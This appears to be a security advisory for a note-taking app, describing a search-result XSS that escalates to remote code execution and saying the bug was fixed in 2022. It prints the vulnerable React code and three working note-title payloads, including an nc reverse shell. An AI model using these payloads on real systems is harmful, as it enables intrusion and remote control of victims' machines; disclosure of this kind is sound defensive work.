Tested and works on Windows and Linux.\n\nReported and fixed: 2022-06\n\n## Technical overview\n\n1. Create a note with javascript payload as title (POC:s bellow)\n2. Press `Ctrl+P` and search for something in the note or title\n3. Payload is executed when shown in the search result\n4. Remote code execution can be achieved by sharing the notebook\n\nProblem is because `dangerouslySetInnerHTML` is used with unescaped user input in `GotoAnything.tsx` line `509`. Fix by escaping user input.\n\n```\nreturn (\n  <div key={item.id} className={isSelected ? 'selected' : null} style={rowStyle} onClick={this.listItem_onClick} data-id={item.id} data-parent-id={item.parent_id} data-type={item.type}>\n    <div style={style.rowTitle} dangerouslySetInnerHTML={{ __html: titleHtml }}></div>\n    {fragmentComp}\n    {pathComp}\n  </div>\n);\n```\n\n## POC\n\nSpace can not be used in payload, but encoded space `\\x20` can be used.\n\nExample tile payloads:\n\n```\n# Payload 1 (Linux)\nzzz<img src =q onerror=eval(\"require('child_process').exec('mate-calc');\");>\n\n# Payload 2 (Windows)\nzzz<img src =q onerror=eval(\"require('child_process').exec('calc.exe');\");>\n\n# Reverse shell (Linux)\nzzz<img src =q onerror=eval(\"require('child_process').exec('/bin/nc\\x20-e\\x20/bin/bash\\x20127.0.0.1\\x205000');\");>\n```\n\nSearch for `zzz` to execute payload.",

The vulnerability can be triggered when the user searches for a note or title using the search functionality, or by sharing a notebook with a malicious payload.",
